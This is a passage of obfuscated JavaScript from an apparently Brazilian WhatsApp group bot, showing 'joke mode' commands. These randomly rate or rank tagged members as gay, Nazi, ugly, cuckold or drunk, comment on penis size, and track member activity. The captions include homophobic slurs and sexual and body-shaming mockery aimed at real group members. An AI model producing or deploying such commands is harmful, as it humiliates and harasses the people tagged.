                  for (_0xc3d45a of _0x2fd1cd) {
                    _0x3529b0 += _0xc3d45a + "\n\n";
                  }
                  _0x403602(_0x3529b0);
                }
              } catch (_0x23ed74) {
                console.error(_0x23ed74);
              }
              break;
            case "88738":
              const _0x9c4e3a = {
                text: "Clique em COPIAR para Copiar\n" + _0x1d6557
              };
              _0x263319.relayMessage(_0x4f1071, {
                interactiveMessage: {
                  body: _0x9c4e3a,
                  footer: {
                    text: ""
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "cta_copy",
                      buttonParamsJson: JSON.stringify({
                        display_text: "COPIAR",
                        id: "sim",
                        copy_code: "" + _0x1d6557
                      })
                    }]
                  }
                }
              }, {});
              break;
            case "chance":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              var _0x42d85c = _0x2e320b.slice(7);
              const _0x13f63e = {
                text: "Você precisa digitar da forma correta\nExemplo: " + _0x1d93be + "chance do luuck ser gay"
              };
              const _0x3bcfcd = {
                quoted: _0x302296
              };
              if (_0x40e45c.length < 1) {
                return _0x263319.sendMessage(_0x4f1071, _0x13f63e, _0x3bcfcd);
              }
              random = "" + Math.floor(Math.random() * 100);
              hasil = "A chance " + _0x2e320b.slice(8) + "\n\né de... " + random + "%";
              const _0x7a544d = {
                text: hasil,
                mentions: [_0x32e455]
              };
              const _0x3ec96d = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x7a544d, _0x3ec96d);
              break;
            case "nazista":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              _0x263319.sendMessage(_0x4f1071, {
                text: "❰ Pesquisando a sua ficha de nazista : @" + _0x416d5d.split("@")[0] + " aguarde... ❱",
                mentions: [_0x416d5d]
              });
              setTimeout(async () => {
                random = "" + Math.floor(Math.random() * 110);
                const _0x473f1a = {
                  url: imgnazista
                };
                const _0x573d16 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  image: _0x473f1a,
                  caption: "O quanto você é nazista? \n\n「 @" + _0x416d5d.split("@")[0] + " 」Você é: ❰ " + random + "% ❱  nazista 卐",
                  mentions: [_0x416d5d]
                }, _0x573d16);
              }, 7000);
              break;
            case "gay":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              _0x263319.sendMessage(_0x4f1071, {
                text: "❰ Pesquisando a sua ficha de gay : @" + _0x416d5d.split("@")[0] + " aguarde... ❱",
                mentions: [_0x416d5d]
              });
              setTimeout(async () => {
                random = "" + Math.floor(Math.random() * 110);
                feio = random;
                boiola = random;
                if (boiola < 20) {
                  var _0x787347 = "hmm... você é hetero😔";
                } else if (boiola == 21) {
                  var _0x787347 = "+/- boiola";
                } else if (boiola == 23) {
                  var _0x787347 = "+/- boiola";
                } else if (boiola == 24) {
                  var _0x787347 = "+/- boiola";
                } else if (boiola == 25) {
                  var _0x787347 = "+/- boiola";
                } else if (boiola == 26) {
                  var _0x787347 = "+/- boiola";
                } else if (boiola == 27) {
                  var _0x787347 = "+/- boiola";
                } else if (boiola == 2) {
                  var _0x787347 = "+/- boiola";
                } else if (boiola == 29) {
                  var _0x787347 = "+/- boiola";
                } else if (boiola == 30) {
                  var _0x787347 = "+/- boiola";
                } else if (boiola == 31) {
                  var _0x787347 = "tenho minha desconfiança...😑";
                } else if (boiola == 32) {
                  var _0x787347 = "tenho minha desconfiança...😑";
                } else if (boiola == 33) {
                  var _0x787347 = "tenho minha desconfiança...😑";
                } else if (boiola == 34) {
                  var _0x787347 = "tenho minha desconfiança...😑";
                } else if (boiola == 35) {
                  var _0x787347 = "tenho minha desconfiança...😑";
                } else if (boiola == 36) {
                  var _0x787347 = "tenho minha desconfiança...😑";
                } else if (boiola == 37) {
                  var _0x787347 = "tenho minha desconfiança...😑";
                } else if (boiola == 3) {
                  var _0x787347 = "tenho minha desconfiança...😑";
                } else if (boiola == 39) {
                  var _0x787347 = "tenho minha desconfiança...😑";
                } else if (boiola == 40) {
                  var _0x787347 = "tenho minha desconfiança...😑";
                } else if (boiola == 41) {
                  var _0x787347 = "você é né?😏";
                } else if (boiola == 42) {
                  var _0x787347 = "você é né?😏";
                } else if (boiola == 43) {
                  var _0x787347 = "você é né?😏";
                } else if (boiola == 44) {
                  var _0x787347 = "você é né?😏";
                } else if (boiola == 45) {
                  var _0x787347 = "você é né?😏";
                } else if (boiola == 46) {
                  var _0x787347 = "você é né?😏";
                } else if (boiola == 47) {
                  var _0x787347 = "você é né?😏";
                } else if (boiola == 4) {
                  var _0x787347 = "você é né?😏";
                } else if (boiola == 49) {
                  var _0x787347 = "você é né?😏";
                } else if (boiola == 50) {
                  var _0x787347 = "você é ou não?🧐";
                } else if (boiola > 51) {
                  var _0x787347 = "você é gay🙈";
                }
                const _0x18b831 = {
                  url: imggay
                };
                const _0x3b8be4 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  image: _0x18b831,
                  caption: "  O quanto você é gay? \n\n 「 @" + _0x416d5d.split("@")[0] + " 」Você é: ❰ " + random + "% ❱ gay 🏳️‍🌈\n\n" + _0x787347,
                  mentions: [_0x416d5d],
                  thumbnail: null
                }, _0x3b8be4);
              }, 7000);
              break;
            case "feio":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              _0x263319.sendMessage(_0x4f1071, {
                text: "❰ Pesquisando a sua ficha de feio : @" + _0x416d5d.split("@")[0] + " aguarde... ❱",
                mentions: [_0x416d5d]
              });
              setTimeout(async () => {
                random = "" + Math.floor(Math.random() * 110);
                feio = random;
                if (feio < 20) {
                  var _0x5bbf4f = "É não é feio";
                } else if (feio == 21) {
                  var _0x5bbf4f = "+/- feio";
                } else if (feio == 23) {
                  var _0x5bbf4f = "+/- feio";
                } else if (feio == 24) {
                  var _0x5bbf4f = "+/- feio";
                } else if (feio == 25) {
                  var _0x5bbf4f = "+/- feio";
                } else if (feio == 26) {
                  var _0x5bbf4f = "+/- feio";
                } else if (feio == 27) {
                  var _0x5bbf4f = "+/- feio";
                } else if (feio == 2) {
                  var _0x5bbf4f = "+/- feio";
                } else if (feio == 29) {
                  var _0x5bbf4f = "+/- feio";
                } else if (feio == 30) {
                  var _0x5bbf4f = "+/- feio";
                } else if (feio == 31) {
                  var _0x5bbf4f = "Ainda tá na média";
                } else if (feio == 32) {
                  var _0x5bbf4f = "Da pra pegar umas(ns) novinha(o) ainda";
                } else if (feio == 33) {
                  var _0x5bbf4f = "Da pra pegar umas(ns) novinha(o) ainda";
                } else if (feio == 34) {
                  var _0x5bbf4f = "É fein, mas tem baum coração";
                } else if (feio == 35) {
                  var _0x5bbf4f = "Tá na média, mas não deixa de ser feii";
                } else if (feio == 36) {
                  var _0x5bbf4f = "Bonitin mas é feio com orgulho";
                } else if (feio == 37) {
                  var _0x5bbf4f = "Feio e preguiçoso(a), vai se arrumar praga feia";
                } else if (feio == 3) {
                  var _0x5bbf4f = "tenho ";
                } else if (feio == 39) {
                  var _0x5bbf4f = "Feio, mas um banho E se arrumar, deve resolver";
                } else if (feio == 40) {
                  var _0x5bbf4f = "FeiN,  mas não existe gente feia, existe gente que não conhece os produtos jequity";
                } else if (feio == 41) {
                  var _0x5bbf4f = "você é Feio, mas é legal, continue assim";
                } else if (feio == 42) {
                  var _0x5bbf4f = "Nada que uma maquiagem e se arrumar, que não resolva 🥴";
                } else if (feio == 43) {
                  var _0x5bbf4f = "Feio que dói de ver, compra uma máscara que melhora";
                } else if (feio == 44) {
                  var _0x5bbf4f = "Feio mas nada que um saco na cabeça não resolva né!?";
                } else if (feio == 45) {
                  var _0x5bbf4f = "você é feio, mas tem bom gosto";
                } else if (feio == 46) {
                  var _0x5bbf4f = "Feio mas tem muitos amigos";
                } else if (feio == 47) {
                  var _0x5bbf4f = "Feio mas tem lábia pra pegar várias novinha";
                } else if (feio == 4) {
                  var _0x5bbf4f = "Feio e ainda não sabe se vestir, vixi";
                } else if (feio == 49) {
                  var _0x5bbf4f = "Feiooo";
                } else if (feio == 50) {
                  var _0x5bbf4f = "você é Feio, mas não se encherga 🧐";
                } else if (feio > 51) {
                  var _0x5bbf4f = "você é Feio demais 🙈";
                }
                const _0x4bc954 = {
                  url: imgfeio
                };
                const _0x33aab7 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  image: _0x4bc954,
                  caption: "  O quanto você é feio? \n\n 「 @" + _0x416d5d.split("@")[0] + " 」Você é: ❰ " + random + "% ❱ feio 🙉\n\n" + _0x5bbf4f,
                  mentions: [_0x416d5d],
                  thumbnail: null
                }, _0x33aab7);
              }, 7000);
              break;
            case "corno":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              _0x263319.sendMessage(_0x4f1071, {
                text: " ❰ Pesquisando a ficha de corno : @" + _0x416d5d.split("@")[0] + ", aguarde... ❱",
                mentions: [_0x416d5d]
              });
              setTimeout(async () => {
                random = "" + Math.floor(Math.random() * 110);
                const _0x46e44e = {
                  url: imgcorno
                };
                const _0x5e4e21 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  image: _0x46e44e,
                  caption: " O quanto você é corno? \n\n 「 @" + _0x416d5d.split("@")[0] + " 」Você é: ❰ " + random + "% ❱  corno 🐃",
                  mentions: [_0x416d5d]
                }, _0x5e4e21);
              }, 7000);
              break;
            case "vesgo":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              _0x263319.sendMessage(_0x4f1071, {
                text: "❰ Pesquisando a ficha de vesgo : @" + _0x416d5d.split("@")[0] + ", aguarde... ❱",
                mentions: [_0x416d5d]
              });
              setTimeout(async () => {
                random = "" + Math.floor(Math.random() * 110);
                const _0x112abc = {
                  url: imgvesgo
                };
                const _0x48536b = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  image: _0x112abc,
                  caption: "O quanto você é vesgo? \n\n「 @" + _0x416d5d.split("@")[0] + " 」Você é: ❰ " + random + "% ❱  Vesgo 🙄😆",
                  mentions: [_0x416d5d]
                }, _0x48536b);
              }, 7000);
              break;
            case "bebado":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              _0x263319.sendMessage(_0x4f1071, {
                text: "❰ Pesquisando a ficha de bebado : @" + _0x416d5d.split("@")[0] + " , aguarde... ❱",
                mentions: [_0x416d5d]
              });
              setTimeout(async () => {
                random = "" + Math.floor(Math.random() * 110);
                const _0x16f75e = {
                  url: imgbebado
                };
                const _0x299f39 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  image: _0x16f75e,
                  caption: "O quanto você é bebado? \n\n「 @" + _0x416d5d.split("@")[0] + " 」Você é: ❰ " + random + "% ❱ Bêbado 🤢🥵🥴",
                  mentions: [_0x416d5d]
                }, _0x299f39);
              }, 7000);
              break;
            case "gado":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              _0x263319.sendMessage(_0x4f1071, {
                text: "❰ Pesquisando a ficha de gado : @" + _0x416d5d.split("@")[0] + ", aguarde... ❱",
                mentions: [_0x416d5d]
              });
              setTimeout(async () => {
                random = "" + Math.floor(Math.random() * 110);
                const _0x2159f0 = {
                  url: imggado
                };
                const _0x372e2d = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  image: _0x2159f0,
                  caption: "O quanto você é gado? \n\n「 @" + _0x416d5d.split("@")[0] + " 」Você é: ❰ " + random + "% ❱  gado 🐂",
                  mentions: [_0x416d5d]
                }, _0x372e2d);
              }, 7000);
              break;
            case "gostoso":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              _0x263319.sendMessage(_0x4f1071, {
                text: " ❰ Pesquisando a sua ficha de gostoso : @" + _0x416d5d.split("@")[0] + " aguarde... ❱",
                mentions: [_0x416d5d]
              });
              setTimeout(async () => {
                random = "" + Math.floor(Math.random() * 110);
                const _0x3fc303 = {
                  url: imggostoso
                };
                const _0x717cca = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  image: _0x3fc303,
                  caption: "O quanto você é gostoso? 😏\n\n「 @" + _0x416d5d.split("@")[0] + " 」Você é: ❰ " + random + "% ❱ gostoso 😝",
                  gifPlayback: true,
                  mentions: [_0x416d5d]
                }, _0x717cca);
              }, 7000);
              break;
            case "gostosa":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              _0x263319.sendMessage(_0x4f1071, {
                text: "❰ Pesquisando a sua ficha de gostosa : @" + _0x416d5d.split("@")[0] + " aguarde... ❱",
                mentions: [_0x416d5d]
              });
              setTimeout(async () => {
                random = "" + Math.floor(Math.random() * 110);
                const _0x2410e2 = {
                  url: imggostosa
                };
                const _0x534e83 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  image: _0x2410e2,
                  caption: "O quanto você é gostosa? 😏\n\n「 @" + _0x416d5d.split("@")[0] + " 」Você é: ❰ " + random + "% ❱ gostosa 😳",
                  mentions: [_0x416d5d]
                }, _0x534e83);
              }, 7000);
              break;
            case "matar":
            case "mata":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (!_0x1dcf0a || _0x5b0a24[1]) {
                return _0x403602("marque o alvo que você quer matar, a mensagem ou o @");
              }
              const _0x57bf53 = {
                url: matarcmd
              };
              const _0x376903 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, {
                video: _0x57bf53,
                gifPlayback: true,
                caption: "Você Acabou de matar o(a) @" + _0x1dcf0a.split("@")[0] + " 😈👹",
                mentions: [_0x1dcf0a]
              }, _0x376903);
              break;
            case "beijo":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (!_0x1dcf0a || _0x5b0a24[1]) {
                return _0x403602("marque a pessoa que você quer beijar, a mensagem ou o @");
              }
              const _0x3e8c3b = {
                url: beijocmd
              };
              const _0x1be7f8 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, {
                video: _0x3e8c3b,
                gifPlayback: true,
                caption: "Você deu um beijo gostoso na(o) @" + _0x1dcf0a.split("@")[0] + " 😁👉👈❤",
                mentions: [_0x1dcf0a]
              }, _0x1be7f8);
              break;
            case "biografia":
              try {
                var _0x4d0d40 = await _0x263319.fetchStatus(_0xbe84ac);
              } catch {
                var _0x4d0d40 = "Privado ou inexistente. ";
              }
              _0x403602(_0x4d0d40);
              break;
            case "tapa":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (!_0x1dcf0a || _0x5b0a24[1]) {
                return _0x403602("marque o alvo que você quer da um tapa, a mensagem ou o @");
              }
              const _0xf86055 = {
                url: tapacmd
              };
              const _0x2e341b = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, {
                video: _0xf86055,
                gifPlayback: true,
                caption: "Você Acabou de da um tapa na raba da😏 @" + _0x1dcf0a.split("@")[0] + " 🔥",
                mentions: [_0x1dcf0a]
              }, _0x2e341b);
              break;
            case "chute":
            case "chutar":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (!_0x1dcf0a || _0x5b0a24[1]) {
                return _0x403602("marque o alvo que você quer da um chute, a mensagem ou o @");
              }
              const _0xb3fc03 = {
                url: chutecmd
              };
              const _0x1241cd = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, {
                video: _0xb3fc03,
                gifPlayback: true,
                caption: "Você Acabou de da um chute em @" + _0x1dcf0a.split("@")[0] + " 🤡",
                mentions: [_0x1dcf0a]
              }, _0x1241cd);
              break;
            case "dogolpe":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (!_0x1dcf0a || _0x5b0a24[1]) {
                return _0x403602("Marque a mensagem com o comando ou marque o @ do usuário..");
              }
              random = "" + Math.floor(Math.random() * 100);
              _0x263319.sendMessage(_0x4f1071, {
                text: "*GOLPISTA ENCONTRADO👉🏻*\n\n*GOLPISTA* : *@" + _0x1dcf0a.split("@")[0] + "*\n*PORCENTAGEM DO GOLPE* : " + random + "%😂\n\nEle(a) gosta de ferir sentimentos 😢",
                mentions: [_0x1dcf0a]
              });
              break;
            case "shipo":
              if (!_0x5b0a24) {
                return _0x403602("Marque uma pessoa do grupo para encontrar o par dela");
              }
              _0x5b6fe5("*Hmmm.... Eu Shipo eles 2💘💘*\n\n1 = @" + _0x5b3ba6[Math.floor(Math.random() * _0x5b3ba6.length)].id.split("@")[0] + "\n && 2 = " + _0x5b0a24.split("@")[0] + " com uma porcentagem de: " + (Math.floor(Math.random() * 100) + "%"));
              break;
            case "casal":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              _0x5b6fe5("*Hmmm.... Eu Shipo eles 2💘💘*\n\n1= @" + _0x5b3ba6[Math.floor(Math.random() * _0x5b3ba6.length)].id.split("@")[0] + "\ne esse\n2= @" + _0x5b3ba6[Math.floor(Math.random() * _0x5b3ba6.length)].id.split("@")[0] + "\ncom uma porcentagem de: " + (Math.floor(Math.random() * 100) + "%"));
              break;
            case "ranklevel":
            case "rankativos":
            case "rankativo":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              var _0x43cf52 = countMessage.map(_0x5b0cb5 => _0x5b0cb5.groupId).indexOf(_0x4f1071);
              var _0x5185f1 = countMessage[_0x43cf52].numbers.map(_0x220c24 => _0x220c24);
              _0x5185f1.sort((_0x401bef, _0x50b7bd) => (_0x401bef.figus == undefined ? _0x401bef.figus = 0 : _0x401bef.figus + _0x401bef.messages + _0x401bef.cmd_messages) < (_0x50b7bd.figus == undefined ? _0x50b7bd.figus = 0 : _0x50b7bd.figus + _0x50b7bd.cmd_messages + _0x50b7bd.messages) ? 0 : -1);
              menc = [];
              blad = "\n┌────────────────┐\n│ RANK DE MAIS ATIVOS DO GRUPO\n";
              for (_0xc3d45a = 0; _0xc3d45a < (_0x5185f1.length < 5 ? _0x5185f1.length : 5); _0xc3d45a++) {
                var _0x537f44 = patentes.map(_0xad5dd1 => _0xad5dd1.grupoID).indexOf(_0x4f1071);
                var _0x209e1e = patentes[_0x537f44].usus.map(_0x521f3f => _0x521f3f.id).indexOf(_0x5185f1[_0xc3d45a].id);
                if (_0xc3d45a != null) {
                  blad += "\n┌───────────────\n│ " + (_0xc3d45a + 1) + "º : @" + _0x5185f1[_0xc3d45a].id.split("@")[0] + "\n└─────\n   ༶ Mensagens: " + _0x5185f1[_0xc3d45a].messages + "\n   ༶ Comandos dados: " + _0x5185f1[_0xc3d45a].cmd_messages + (_0x209e1e < 0 ? "" : "\n   ༶ Patente: " + patentes[_0x537f44].usus[_0x209e1e].patente_usu) + "\n   ༶ Conectado em: " + _0x5185f1[_0xc3d45a].aparelho + "\n   ༶ Figurinhas: " + _0x5185f1[_0xc3d45a].figus + "\n└────────────\n";
                }
                menc.push(_0x5185f1[_0xc3d45a].id);
              }
              _0xd7aa55(blad, menc, true);
              break;
            case "rankinativo":
            case "rankinativos":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              bule = [];
              bule2 = [];
              mentioned_jid = [];
              for (cag of countMessage[_0x981834].numbers) {
                bule2.push(cag.id);
                if (cag.messages <= 1) {
                  bule.push(cag);
                }
              }
              bule.sort((_0x5d672d, _0x14fde1) => _0x5d672d.messages + _0x5d672d.cmd_messages < _0x14fde1.cmd_messages + _0x14fde1.messages ? 0 : -1);
              boardi = "Rank dos mais Ghosts do Grupo:\n\n";
              if (bule.length == 0) {
                boardi += "Sem Ghosts";
              }
              for (_0xc3d45a = 0; _0xc3d45a < (bule.length < 5 ? bule.length : 5); _0xc3d45a++) {
                if (_0xc3d45a != null) {
                  boardi += _0xc3d45a + 1 + "º : @" + bule[_0xc3d45a].id.split("@")[0] + "\nMensagens: " + bule[_0xc3d45a].messages + "\nComandos dados: " + bule[_0xc3d45a].cmd_messages + "\nAparelho: " + bule[_0xc3d45a].aparelho + "\n\n";
                }
                mentioned_jid.push(bule[_0xc3d45a].id);
              }
              _0xd7aa55(boardi, mentioned_jid, true);
              break;
            case "checkativo":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (_0x154c95.indexOf(_0x4f1071) < 0) {
                return _0x403602("O bot não tem ainda dados sobre o grupo");
              }
              var _0x981834 = _0x154c95.indexOf(_0x4f1071);
              if (!_0x1dcf0a || _0x5b0a24[1]) {
                return _0x403602("Marque o @ de quem deseja puxar a atividade / Só pode um por vez..");
              }
              if (_0x2c5658.indexOf(_0x1dcf0a) >= 0) {
                var _0x5682cd = _0x2c5658.indexOf(_0x1dcf0a);
                var _0x3cad2c = countMessage[_0x981834].numbers[_0x5682cd];
                _0xd7aa55("𖣘⃟ᗒ Consulta das atividade de\n𖣘⃟ᗒ @" + _0x1dcf0a.split("@")[0] + " no grupo: " + _0x471350 + "\n𖣘⃟ᗒ Mensagens: " + _0x3cad2c.messages + "\n𖣘⃟ᗒ Comandos dados: " + _0x3cad2c.cmd_messages + "\n𖣘⃟ᗒ Conectado em: " + _0x3cad2c.aparelho + "\n𖣘⃟   Figurinhas: " + _0x3cad2c.figus, [_0x1dcf0a], true);
              } else {
                _0xd7aa55("⋆⃟ۣۜ᭪➣ Consulta da atividade de ⋆⃟ۣۜ᭪➣ @" + _0x1dcf0a.split("@")[0] + " no grupo\n⋆⃟ۣۜ᭪➣ Mensagens: 0\n⋆⃟ۣۜ᭪➣ Comandos dados: 0", [_0x1dcf0a], true);
              }
              break;
            case "rankgay":
            case "rankgays":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602(_0x4d2470);
              }
              ABC = "*🤖RANK DOS 5 MAIS GAYS DO GRUPO [ " + _0x471350 + " ]🏳‍🌈*\n\n";
              for (var _0xc3d45a = 0; _0xc3d45a < 5; _0xc3d45a++) {
                ABC += Math.floor(Math.random() * 100) + "% @" + _0x1bed8b[Math.floor(Math.random() * _0x1bed8b.length)].split("@")[0] + "\n\n";
              }
              _0x50a2b8(ABC, rnkgay);
              break;
            case "rankgado":
            case "rankgados":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602(_0x4d2470);
              }
              ABC = "RANK DOS 5 MAIS GADO DO GRUPO 🐂🐃\n\n";
              for (var _0xc3d45a = 0; _0xc3d45a < 5; _0xc3d45a++) {
                ABC += Math.floor(Math.random() * 100) + "% @" + _0x1bed8b[Math.floor(Math.random() * _0x1bed8b.length)].split("@")[0] + "\n\n";
              }
              _0x50a2b8(ABC, rnkgado);
              break;
            case "rankcorno":
            case "rankcornos":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602(_0x4d2470);
              }
              ABC = "RANK DOS 5 MAIS CORNO DO GRUPO 🐂\n\n";
              for (var _0xc3d45a = 0; _0xc3d45a < 5; _0xc3d45a++) {
                ABC += Math.floor(Math.random() * 100) + "% @" + _0x1bed8b[Math.floor(Math.random() * _0x1bed8b.length)].split("@")[0] + "\n\n";
              }
              _0x50a2b8(ABC, rnkcorno);
              break;
            case "rankgostosos":
            case "rankgostoso":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602(_0x4d2470);
              }
              ABC = "RANK DOS 5 MAIS GOSTOSOS DO GRUPO 😏🔥\n\n";
              for (var _0xc3d45a = 0; _0xc3d45a < 5; _0xc3d45a++) {
                ABC += Math.floor(Math.random() * 100) + "% @" + _0x1bed8b[Math.floor(Math.random() * _0x1bed8b.length)].split("@")[0] + "\n\n";
              }
              _0x50a2b8(ABC, rnkgostoso);
              break;
            case "rankgostosos":
            case "rankgostoso":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602(_0x4d2470);
              }
              ABC = "RANK DAS 5 MAIS GOSTOSAS DO GRUPO 😏🔥\n\n";
              for (var _0xc3d45a = 0; _0xc3d45a < 5; _0xc3d45a++) {
                ABC += Math.floor(Math.random() * 100) + "% @" + _0x1bed8b[Math.floor(Math.random() * _0x1bed8b.length)].split("@")[0] + "\n\n";
              }
              _0x50a2b8(ABC, rnkgostosa);
              break;
            case "ranknazista":
            case "ranknazistas":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602(_0x4d2470);
              }
              ABChshs = "*💂‍♂RANK DOS 5 MAIS NAZISTAS DO GRUPO 卐🤡*\n\n";
              for (var _0xc3d45a = 0; _0xc3d45a < 5; _0xc3d45a++) {
                ABChshs += Math.floor(Math.random() * 100) + "% @" + _0x1bed8b[Math.floor(Math.random() * _0x1bed8b.length)].split("@")[0] + "\n\n";
              }
              _0x50a2b8(ABChshs, rnknazista);
              break;
            case "rankotaku":
            case "rankotakus":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602(_0x4d2470);
              }
              ABC = "*㊙ RANK DOS 5 MAIS OTAKU DO GRUPO ( ˶•̀ _•́ ˶)*\n\n";
              for (var _0xc3d45a = 0; _0xc3d45a < 5; _0xc3d45a++) {
                ABC += Math.floor(Math.random() * 100) + "% @" + _0x1bed8b[Math.floor(Math.random() * _0x1bed8b.length)].split("@")[0] + "\n\n";
              }
              _0x50a2b8(ABC, rnkotaku);
              break;
            case "rankpau":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x23cd8e) {
                return _0x403602(_0x4d2470);
              }
              ABC = "*RANK DOS 5 PAU MAIOR DO GRUPO 📏*\n\n";
              TMPAU = ["Pequeno pra cact, se mata maluco 🥴", "Pequenininho chega ser até fofo 🥺", "Menor que meu dedo mindinho pequeno demais 😑", "Até que dá sentir, tá na média 😌", "Grandinho 🥵", "Grande até ", "Gigantesco igual meu braço 😖", "Enorme quase chega no útero 🤧", "Grandão demais em, e uii 🤯", "Vara de pegar manga, grande demais, como sai na rua assim??", "Que grandão em, nasceu metade animal 😳"];
              for (var _0xc3d45a = 0; _0xc3d45a < 5; _0xc3d45a++) {
                ABC += TMPAU[Math.floor(Math.random() * TMPAU.length)] + " _- @" + _0x1bed8b[Math.floor(Math.random() * _0x1bed8b.length)].split("@")[0] + "\n\n";
              }
              _0x50a2b8(ABC, rnkpau);
              break;
            case "jogodavelha":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x5b0a24) {
                return _0x403602("Marque junto com o comando, o @ do usuário que deseja desafiar..");
              }
              joguinhodavelhajs.push(_0x32e455);
              fs.writeFileSync("./DADOS/usuarios/joguinhodavelha.json", JSON.stringify(joguinhodavelhajs));
